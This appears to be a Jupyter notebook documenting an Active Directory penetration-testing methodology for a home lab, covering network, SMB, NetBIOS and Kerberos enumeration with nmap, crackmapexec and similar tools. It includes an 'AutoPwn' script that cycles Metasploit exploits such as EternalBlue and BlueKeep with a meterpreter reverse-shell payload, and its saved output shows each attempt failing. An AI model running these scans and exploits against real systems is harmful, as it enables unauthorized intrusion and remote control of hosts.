{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "nbpresent": {
     "id": "45e1a318-9152-480d-9a7c-90764685fb8f"
    }
   },
   "source": [
    "# Introduction\n",
    "\n",
    "Detailed in this Jupyter Notebook is the methodology utilized to Pen Test Active Directory. This Jupyter Notebook will also serve to standardize techniques across lab resources and train resources on a common methodology."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Setup"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Jupyter Notebooks have a kernel that can be either Python 3 (allowing you to execute Python code directly in code cells) or a Bash kernel (enabling you to run Linux commands). \n",
    "\n",
    "Most Kali Linux commands are executed in a Bash terminal, and you can change the Jupyter Notebook kernel to Bash via Kernel > Change Kernel or using the option in the top-right corner.\n",
    "\n",
    "However, in this case, we will use Python and its os.system('command') function to execute Kali tools. This approach allows us to:\n",
    "\n",
    ">Easily integrate Jupyter Notebook with Kali Linux tools.\n",
    "\n",
    ">Capture command outputs for documentation.\n",
    "\n",
    ">Analyze results using Python’s data science capabilities.\n",
    "\n",
    ">Later, enhance analysis with Anaconda and DeepSeek.\n",
    "\n",
    "Make sure to run the setup scripts to install the tools before hand, or via the below cells."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Setup All Tools "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "os.system('echo \"kali\" | sudo -S apt update && sudo -S apt install -y nmap nbtscan')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Install Tools via Jupiter Notebook\n",
    "\n",
    "I am experimenting with the best way to install tools to work interactively within Jupyter Notebook. Here are some examples:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!echo \"kali\" | sudo apt update && apt install -y nmap\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!echo 'kali' | sudo apt upgrade -y nmap"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "os.system('echo \"kali\" | sudo -S apt update && sudo -S apt install -y nmap')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "os.system('echo \"kali\" | sudo -S apt update && apt upgrade -y nmap')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!nmap --version"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "os.system(\"nmap --version\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import subprocess\n",
    "\n",
    "# Define the nmap command\n",
    "command = [\"nmap\", \"-sP\", \"10.2.10.0/24\"]\n",
    "\n",
    "# Run the command and capture the output\n",
    "result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n",
    "\n",
    "# Print the output\n",
    "if result.returncode == 0:\n",
    "    print(\"Nmap scan results:\")\n",
    "    print(result.stdout)\n",
    "else:\n",
    "    print(\"Error running nmap:\")\n",
    "    print(result.stderr)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# In another cell, you can use the information from previous result\n",
    "\n",
    "print(result)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Reconnaissance"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "> Always save your results for later analysie, create libary for later use and name each text tile. Then use all of the outputs to creat a report.\n",
    "\n",
    "> Once the variables have been setup, you can Runtime, Run All to create the report."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## START TIME"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "code_folding": []
   },
   "outputs": [],
   "source": [
    "from datetime import datetime\n",
    "\n",
    "now = datetime.now()\n",
    "\n",
    "start_time = now.strftime(\"%H:%M:%S\")\n",
    "print(\"Start Time =\", start_time)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#@ Defaults\n",
    "Prior to running any cells assign a value to the variables and run the cell. This will change the targets for subdomain enumeration without needing to modify the script parameters. An example of an acceptable domain to replace the parameter with would be: \"protiviti.com\". Next set the ORG_NAME variable to the name of the target org."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "#Set DOMAIN & FOLDER_NAME Variable\n",
    "DOMAIN = \"example.com\"\n",
    "ORG_NAME = \"example\"\n",
    "FOLDER_NAME = \"example\"\n",
    "!mkdir $FOLDER_NAME"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print(\"The Following variables have been set:\")\n",
    "print(\"\")\n",
    "print(\"DOMAIN NAME: \" + DOMAIN)\n",
    "print(\"FOLDER NAME: \" + FOLDER_NAME)\n",
    "print(\"\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print(\"Cloudenum in progress\")\n",
    "!python3 {configDict['cloudenum']['path']} -k $ORG_NAME -t 50 --disable-gcp --disable-azure -l cloudenum.csv\n",
    "!mv --target-directory=$FOLDER_NAME/ cloudenum.csv\n",
    "print(\"\")\n",
    "print(\"Cloudenum Complete\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Network Discovery"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!ip a"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!for i in {1..255}; do ping -c 1 10.2.10.$i | grep \"bytes from\" | cut -d \" \" -f 4 | tr -d \":\" & done"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Create Targets.txt\n",
    "!for i in {1..255}; do ping -c 1 10.2.10.$i | grep \"bytes from\" | cut -d \" \" -f 4 | tr -d \":\" & done > targets.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Read and print the contents of targets.txt\n",
    "with open('targets.txt', 'r') as file:\n",
    "    targets = file.read()\n",
    "print(targets)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!nmap -n -sn 10.2.10.0/24 -oG - | awk '/Up$/{print $2}'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Scan for Open Ports (using nmap):\n",
    "\n",
    "!nmap -sP 10.2.10.0/24\n",
    "!nmap -p- -sCV -sS -T4 10.2.10.11 -vv\n",
    "!nmap -n -sn 10.2.10.0/24 -oG - | awk '/Up$/{print $2}'\n",
    "!nmap -iL targets.txt -sV --open -oG - | grep \"Ports:\"\n",
    "\n",
    "nmap -sP -p <ip>  # ping scan\n",
    "nmap -PN -sV --top-ports 50 --open <ip>  # quick scan\n",
    "nmap -PN --script smb-vuln* -p139,445 <ip>  # search smb vuln\n",
    "nmap -PN -sC -sV <ip>  # classic scan\n",
    "nmap -PN -sC -sV -p- <ip>  # full scan\n",
    "nmap -sU -sC -sV <ip>  # udp scan"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Scan for open ports on a target Windows machine:\n",
    "\n",
    "!nmap -p- -T4 10.2.10.0/24"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!nmap -sP 10.2.10.0/24"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!nmap -iL targets.txt -sV --open -oG - | grep \"Ports:\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!nmap -sP -iL targets.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!nmap -p- -sCV -sS -T4 10.2.10.11 -vv"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Netbios Enumeration"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!nbtscan -f targets.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!nbtscan -r 10.2.10.0/24\n",
    "!nbtscan -v -s : 10.2.10.0/24"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!nmap -iL targets.txt -sU -p 137 --script nbstat.nse"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!crackmapexec smb 10.2.10.0/24 "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## SMB Enumeration\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Anonymous login successful\n",
      "\n",
      "\tSharename       Type      Comment\n",
      "\t---------       ----      -------\n",
      "Reconnecting with SMB1 for workgroup listing.\n",
      "do_connect: Connection to 10.2.10.11 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\n",
      "Unable to connect with SMB1 -- no workgroup available\n",
      "session setup failed: NT_STATUS_ACCESS_DENIED\n"
     ]
    }
   ],
   "source": [
    "# List SMB Shares (using smbclient):\n",
    "\n",
    "!smbclient -L //10.2.10.11 -N\n",
    "!smbclient -L //10.2.10.21 -N\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "ename": "SyntaxError",
     "evalue": "unterminated string literal (detected at line 31) (679302710.py, line 31)",
     "output_type": "error",
     "traceback": [
      "\u001b[0;36m  Cell \u001b[0;32mIn[4], line 31\u001b[0;36m\u001b[0m\n\u001b[0;31m    msfconsole -q -x \"\u001b[0m\n\u001b[0m                     ^\u001b[0m\n\u001b[0;31mSyntaxError\u001b[0m\u001b[0;31m:\u001b[0m unterminated string literal (detected at line 31)\n"
     ]
    }
   ],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[?2004hrpcclient $> ^C\u001b[?2004l\r"
     ]
    }
   ],
   "source": [
    "!rpcclient -U \"\" -N 10.2.10.11"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!crackmapexec smb 10.2.10.0/24 # enumerate smb hosts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!nslookup -type=SRV _ldap._tcp.dc._msdcs.ludus.domain 10.2.10.11"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!nslookup -type=SRV _ldap._tcp.dc._msdcs.ludus.domain 10.2.10.21"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!nmcli dev show eth0  # show domain name & dns"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Setup Keberos on Linux\n",
    "\n",
    "setup /etc/hosts and kerberos\n",
    "\n",
    "    To use kerberos in our Linux environment we will do some configurations.\n",
    "    First we must set the DNS by configuring the /etc/hosts file"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "!msfconsole -q -x \"search type:exploit platform:windows\" | grep \"exploit/\" | awk '{print $2}' > windows_exploit_paths.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] Trying exploit: exploit/windows/smb/ms17_010_eternalblue\n",
      "\u001b[0m\u001b[1m\u001b[34m[*]\u001b[0m No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp\n",
      "\u001b[0mRHOSTS => 10.2.10.11\n",
      "\u001b[0mPAYLOAD => windows/x64/meterpreter/reverse_tcp\n",
      "\u001b[0mLHOST => 10.2.10.1\n",
      "\u001b[0mLPORT => 4444\n",
      "\u001b[0m\u001b[1m\u001b[31m[-]\u001b[0m Handler failed to bind to 10.2.10.1:4444:-  -\n",
      "\u001b[1m\u001b[34m[*]\u001b[0m Started reverse TCP handler on 0.0.0.0:4444 \n",
      "\u001b[1m\u001b[34m[*]\u001b[0m 10.2.10.11:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check\n",
      "\u001b[1m\u001b[31m[-]\u001b[0m 10.2.10.11:445        - An SMB Login Error occurred while connecting to the IPC$ tree.\n",
      "\u001b[1m\u001b[34m[*]\u001b[0m 10.2.10.11:445        - Scanned 1 of 1 hosts (100% complete)\n",
      "\u001b[1m\u001b[31m[-]\u001b[0m 10.2.10.11:445 - The target is not vulnerable.\n",
      "\u001b[1m\u001b[34m[*]\u001b[0m Exploit completed, but no session was created.\n",
      "\u001b[0m[-] Exploit failed. Trying next exploit...\n",
      "[*] Trying exploit: exploit/windows/smb/ms08_067_netapi\n",
      "\u001b[0m\u001b[1m\u001b[34m[*]\u001b[0m No payload configured, defaulting to windows/meterpreter/reverse_tcp\n",
      "\u001b[0mRHOSTS => 10.2.10.11\n",
      "\u001b[0m\u001b[1m\u001b[31m[-]\u001b[0m The value specified for PAYLOAD is not valid.\n",
      "\u001b[0mLHOST => 10.2.10.1\n",
      "\u001b[0mLPORT => 4444\n",
      "\u001b[0m\u001b[1m\u001b[31m[-]\u001b[0m Handler failed to bind to 10.2.10.1:4444:-  -\n",
      "\u001b[1m\u001b[34m[*]\u001b[0m Started reverse TCP handler on 0.0.0.0:4444 \n",
      "\u001b[1m\u001b[31m[-]\u001b[0m 10.2.10.11:445 - Connection reset during login\n",
      "\u001b[1m\u001b[31m[-]\u001b[0m 10.2.10.11:445 - This most likely means a previous exploit attempt caused the service to crash\n",
      "\u001b[1m\u001b[34m[*]\u001b[0m Exploit completed, but no session was created.\n",
      "\u001b[0m[-] Exploit failed. Trying next exploit...\n",
      "[*] Trying exploit: exploit/windows/smb/psexec\n",
      "\u001b[0m\u001b[1m\u001b[34m[*]\u001b[0m No payload configured, defaulting to windows/meterpreter/reverse_tcp\n",
      "\u001b[1m\u001b[34m[*]\u001b[0m New in Metasploit 6.4 - This module can target a \u001b[32mSESSION\u001b[0m or an \u001b[32mRHOST\u001b[0m\n",
      "\u001b[0mRHOSTS => 10.2.10.11\n",
      "\u001b[0mPAYLOAD => windows/x64/meterpreter/reverse_tcp\n",
      "\u001b[0mLHOST => 10.2.10.1\n",
      "\u001b[0mLPORT => 4444\n",
      "\u001b[0m\u001b[1m\u001b[31m[-]\u001b[0m Handler failed to bind to 10.2.10.1:4444:-  -\n",
      "\u001b[1m\u001b[34m[*]\u001b[0m Started reverse TCP handler on 0.0.0.0:4444 \n",
      "\u001b[1m\u001b[34m[*]\u001b[0m 10.2.10.11:445 - Connecting to the server...\n",
      "\u001b[1m\u001b[34m[*]\u001b[0m 10.2.10.11:445 - Authenticating to 10.2.10.11:445 as user ''...\n",
      "\u001b[1m\u001b[31m[-]\u001b[0m 10.2.10.11:445 - Exploit failed [no-access]: RubySMB::Error::UnexpectedStatusCode The server responded with an unexpected status code: STATUS_ACCESS_DENIED\n",
      "\u001b[1m\u001b[34m[*]\u001b[0m Exploit completed, but no session was created.\n",
      "\u001b[0m[-] Exploit failed. Trying next exploit...\n",
      "[*] Trying exploit: exploit/windows/smb/smb_delivery\n",
      "\u001b[0m\u001b[1m\u001b[34m[*]\u001b[0m No payload configured, defaulting to windows/meterpreter/reverse_tcp\n",
      "\u001b[0m\u001b[1m\u001b[33m[!]\u001b[0m Unknown datastore option: RHOSTS. Did you mean SRVHOST?\n",
      "RHOSTS => 10.2.10.11\n",
      "\u001b[0mPAYLOAD => windows/x64/meterpreter/reverse_tcp\n",
      "\u001b[0mLHOST => 10.2.10.1\n",
      "\u001b[0mLPORT => 4444\n",
      "\u001b[0m\u001b[1m\u001b[34m[*]\u001b[0m Exploit running as background job 0.\n",
      "\u001b[1m\u001b[34m[*]\u001b[0m Exploit completed, but no session was created.\n",
      "\u001b[0m\u001b[1m\u001b[31m[-]\u001b[0m Handler failed to bind to 10.2.10.1:4444:-  -\n",
      "\u001b[1m\u001b[34m[*]\u001b[0m Started reverse TCP handler on 0.0.0.0:4444 \n",
      "\u001b[1m\u001b[34m[*]\u001b[0m Server is running. Listening on 0.0.0.0:445\n",
      "\u001b[1m\u001b[34m[*]\u001b[0m Server started.\n",
      "\u001b[1m\u001b[34m[*]\u001b[0m Run the following command on the target machine:\n",
      "\u001b[1m\u001b[34m[*]\u001b[0m Server stopped.\n",
      "[-] Exploit failed. Trying next exploit...\n",
      "[*] Trying exploit: exploit/windows/http/rejetto_hfs_exec\n",
      "\u001b[0m\u001b[1m\u001b[34m[*]\u001b[0m No payload configured, defaulting to windows/meterpreter/reverse_tcp\n",
      "\u001b[0mRHOSTS => 10.2.10.11\n",
      "\u001b[0mPAYLOAD => windows/x64/meterpreter/reverse_tcp\n",
      "\u001b[0mLHOST => 10.2.10.1\n",
      "\u001b[0mLPORT => 4444\n",
      "\u001b[0m\u001b[1m\u001b[31m[-]\u001b[0m Exploit failed: windows/x64/meterpreter/reverse_tcp is not a compatible payload.\n",
      "\u001b[1m\u001b[34m[*]\u001b[0m Exploit completed, but no session was created.\n",
      "\u001b[0m[-] Exploit failed. Trying next exploit...\n",
      "[*] Trying exploit: exploit/windows/http/badblue_passthru\n",
      "\u001b[0m\u001b[1m\u001b[34m[*]\u001b[0m No payload configured, defaulting to windows/meterpreter/reverse_tcp\n",
      "\u001b[0mRHOSTS => 10.2.10.11\n",
      "\u001b[0mPAYLOAD => windows/x64/meterpreter/reverse_tcp\n",
      "\u001b[0mLHOST => 10.2.10.1\n",
      "\u001b[0mLPORT => 4444\n",
      "\u001b[0m\u001b[1m\u001b[31m[-]\u001b[0m Exploit failed: windows/x64/meterpreter/reverse_tcp is not a compatible payload.\n",
      "\u001b[1m\u001b[34m[*]\u001b[0m Exploit completed, but no session was created.\n",
      "\u001b[0m[-] Exploit failed. Trying next exploit...\n",
      "[*] Trying exploit: exploit/windows/rdp/cve_2019_0708_bluekeep\n",
      "\u001b[0m\n",
      "Matching Modules\n",
      "================\n",
      "\n",
      "   #  Name                                                                Disclosure Date  Rank    Check  Description\n",
      "   -  ----                                                                ---------------  ----    -----  -----------\n",
      "   0  \u001b[45mexploit/windows/rdp/cve_2019_0708_bluekeep\u001b[0m_rce                      2019-05-14       manual  Yes    CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free\n",
      "   1    \\_ target: Automatic targeting via fingerprinting                 .                .       .      .\n",
      "   2    \\_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64)                 .                .       .      .\n",
      "   3    \\_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox 6)  .                .       .      .\n",
      "   4    \\_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 14)     .                .       .      .\n",
      "   5    \\_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15)     .                .       .      .\n",
      "   6    \\_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)   .                .       .      .\n",
      "   7    \\_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)       .                .       .      .\n",
      "   8    \\_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - AWS)           .                .       .      .\n",
      "   9    \\_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - QEMU/KVM)      .                .       .      .\n",
      "\n",
      "\n",
      "Interact with a module by name or index. For example \u001b[32minfo 9\u001b[0m, \u001b[32muse 9\u001b[0m or \u001b[32muse exploit/windows/rdp/cve_2019_0708_bluekeep_rce\u001b[0m\n",
      "After interacting with a module you can manually set a TARGET with \u001b[32mset TARGET 'Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - QEMU/KVM)'\u001b[0m\n",
      "\n",
      "\u001b[1m\u001b[34m[*]\u001b[0m Using exploit/windows/rdp/cve_2019_0708_bluekeep_rce\n",
      "\u001b[1m\u001b[34m[*]\u001b[0m No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp\n",
      "\u001b[0mRHOSTS => 10.2.10.11\n",
      "\u001b[0mPAYLOAD => windows/x64/meterpreter/reverse_tcp\n",
      "\u001b[0mLHOST => 10.2.10.1\n",
      "\u001b[0mLPORT => 4444\n",
      "\u001b[0m\u001b[1m\u001b[31m[-]\u001b[0m Handler failed to bind to 10.2.10.1:4444:-  -\n",
      "\u001b[1m\u001b[34m[*]\u001b[0m Started reverse TCP handler on 0.0.0.0:4444 \n",
      "\u001b[1m\u001b[34m[*]\u001b[0m 10.2.10.11:3389 - Running automatic check (\"set AutoCheck false\" to disable)\n",
      "\u001b[1m\u001b[34m[*]\u001b[0m 10.2.10.11:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check\n",
      "\u001b[1m\u001b[34m[*]\u001b[0m 10.2.10.11:3389       - Scanned 1 of 1 hosts (100% complete)\n",
      "\u001b[1m\u001b[31m[-]\u001b[0m 10.2.10.11:3389 - Exploit aborted due to failure: not-vulnerable: The target is not exploitable. \"set ForceExploit true\" to override check result.\n",
      "\u001b[1m\u001b[34m[*]\u001b[0m Exploit completed, but no session was created.\n",
      "\u001b[0m[-] Exploit failed. Trying next exploit...\n",
      "[*] Trying exploit: exploit/windows/smb/ms10_061_spoolss\n",
      "\u001b[0m\u001b[1m\u001b[34m[*]\u001b[0m No payload configured, defaulting to windows/meterpreter/reverse_tcp\n",
      "\u001b[0mRHOSTS => 10.2.10.11\n",
      "\u001b[0mPAYLOAD => windows/x64/meterpreter/reverse_tcp\n",
      "\u001b[0mLHOST => 10.2.10.1\n",
      "\u001b[0mLPORT => 4444\n",
      "\u001b[0m\u001b[1m\u001b[31m[-]\u001b[0m 10.2.10.11:445 - Exploit failed: windows/x64/meterpreter/reverse_tcp is not a compatible payload.\n",
      "\u001b[1m\u001b[34m[*]\u001b[0m Exploit completed, but no session was created.\n",
      "\u001b[0m[-] Exploit failed. Trying next exploit...\n",
      "[*] Trying exploit: exploit/windows/smb/ms06_040_netapi\n",
      "\u001b[0m\u001b[1m\u001b[34m[*]\u001b[0m No payload configured, defaulting to windows/meterpreter/reverse_tcp\n",
      "\u001b[0mRHOSTS => 10.2.10.11\n",
      "\u001b[0m\u001b[1m\u001b[31m[-]\u001b[0m The value specified for PAYLOAD is not valid.\n",
      "\u001b[0mLHOST => 10.2.10.1\n",
      "\u001b[0mLPORT => 4444\n",
      "\u001b[0m\u001b[1m\u001b[31m[-]\u001b[0m Handler failed to bind to 10.2.10.1:4444:-  -\n",
      "\u001b[1m\u001b[34m[*]\u001b[0m Started reverse TCP handler on 0.0.0.0:4444 \n",
      "\u001b[1m\u001b[31m[-]\u001b[0m 10.2.10.11:445 - Exploit failed [no-access]: Rex::Proto::SMB::Exceptions::LoginError Login Failed: Connection reset by peer\n",
      "\u001b[1m\u001b[34m[*]\u001b[0m Exploit completed, but no session was created.\n",
      "\u001b[0m[-] Exploit failed. Trying next exploit...\n",
      "[*] Trying exploit: exploit/windows/smb/ms09_050_smb2_negotiate_func_index\n",
      "\u001b[0m\u001b[1m\u001b[34m[*]\u001b[0m No payload configured, defaulting to windows/meterpreter/reverse_tcp\n",
      "\u001b[0mRHOSTS => 10.2.10.11\n",
      "\u001b[0mPAYLOAD => windows/x64/meterpreter/reverse_tcp\n",
      "\u001b[0mLHOST => 10.2.10.1\n",
      "\u001b[0mLPORT => 4444\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[0m\u001b[1m\u001b[31m[-]\u001b[0m 10.2.10.11:445 - Exploit failed: windows/x64/meterpreter/reverse_tcp is not a compatible payload.\n",
      "\u001b[1m\u001b[34m[*]\u001b[0m Exploit completed, but no session was created.\n",
      "\u001b[0m[-] Exploit failed. Trying next exploit...\n",
      "[-] No sessions created. All exploits failed.\n"
     ]
    }
   ],
   "source": [
    "#!/usr/bin/env python3\n",
    "\n",
    "import os\n",
    "import subprocess\n",
    "\n",
    "# AutoPwn Script for Windows Targets (Python 3)\n",
    "# Ensure you have proper authorization before running this script.\n",
    "\n",
    "# Variables\n",
    "TARGET_IP = \"10.2.10.11\"  # Replace with the target IP\n",
    "PAYLOAD = \"windows/x64/meterpreter/reverse_tcp\"  # Payload to use\n",
    "LHOST = \"10.2.10.1\"  # Replace with your Kali IP\n",
    "LPORT = \"4444\"  # Port for the reverse shell\n",
    "\n",
    "# List of Windows Exploits to Try\n",
    "EXPLOITS = [\n",
    "    \"exploit/windows/smb/ms17_010_eternalblue\",\n",
    "    \"exploit/windows/smb/ms08_067_netapi\",\n",
    "    \"exploit/windows/smb/psexec\",\n",
    "    \"exploit/windows/smb/smb_delivery\",\n",
    "    \"exploit/windows/http/rejetto_hfs_exec\",\n",
    "    \"exploit/windows/http/badblue_passthru\",\n",
    "    \"exploit/windows/rdp/cve_2019_0708_bluekeep\",\n",
    "    \"exploit/windows/smb/ms10_061_spoolss\",\n",
    "    \"exploit/windows/smb/ms06_040_netapi\",\n",
    "    \"exploit/windows/smb/ms09_050_smb2_negotiate_func_index\",\n",
    "]\n",
    "\n",
    "def run_exploit(exploit):\n",
    "    \"\"\"\n",
    "    Run a Metasploit exploit and check if a session is created.\n",
    "    \"\"\"\n",
    "    print(f\"[*] Trying exploit: {exploit}\")\n",
    "\n",
    "    # Build the msfconsole command\n",
    "    msf_command = (\n",
    "        f\"use {exploit}; \"\n",
    "        f\"set RHOSTS {TARGET_IP}; \"\n",
    "        f\"set PAYLOAD {PAYLOAD}; \"\n",
    "        f\"set LHOST {LHOST}; \"\n",
    "        f\"set LPORT {LPORT}; \"\n",
    "        \"run; \"\n",
    "        \"exit;\"\n",
    "    )\n",
    "\n",
    "    # Run the exploit\n",
    "    subprocess.run([\"msfconsole\", \"-q\", \"-x\", msf_command])\n",
    "\n",
    "    # Check if a session was created\n",
    "    sessions_output = subprocess.run(\n",
    "        [\"msfconsole\", \"-q\", \"-x\", \"sessions -l\"],\n",
    "        capture_output=True,\n",
    "        text=True,\n",
    "    )\n",
    "    if \"Session\" in sessions_output.stdout:\n",
    "        session_id = sessions_output.stdout.split(\"Session \")[1].split()[0]\n",
    "        print(f\"[+] Session created! Session ID: {session_id}\")\n",
    "        return True\n",
    "    else:\n",
    "        print(\"[-] Exploit failed. Trying next exploit...\")\n",
    "        return False\n",
    "\n",
    "def main():\n",
    "    \"\"\"\n",
    "    Main function to iterate through exploits.\n",
    "    \"\"\"\n",
    "    for exploit in EXPLOITS:\n",
    "        if run_exploit(exploit):\n",
    "            break\n",
    "    else:\n",
    "        print(\"[-] No sessions created. All exploits failed.\")\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    main()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# /etc/hosts\n",
    "# GOAD\n",
    "10.2.10.11 ludus.domain\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!echo kali | sudo apt install krb5-user"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!nmap -p 88 --script=krb5-enum-users --script-args=\"krb5-enum-users.realm='<domain>', userdb=<users_list_file>\" <ip>\n",
    "!ls"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!crackmapexec smb 10.2.10.0/24 -u 'none' -p '' --shares "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!crackmapexec smb 10.2.10.0/24 --users"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!netexec smb 10.2.10.0/24  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Check for Null Session Vulnerability (using rpcclient):\n",
    "\n",
    "!rpcclient -U administrator 10.2.10.11\n",
    "!rpcclient -U \"\" 10.2.10.11"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "# Enumerate SMB Users (using enum4linux):\n",
    "\n",
    "#!enum4linux -U 10.2.10.11\n",
    "!enum4linux-ng -A 10.2.10.11\n",
    "!enum4linux-ng -A 10.2.10.21"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!nmap -p- -sC -sV 10.2.10.0/24 -Pn -oA allports.nmap"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!netexec smb 10.2.10.0/24"
   ]
  },
  {
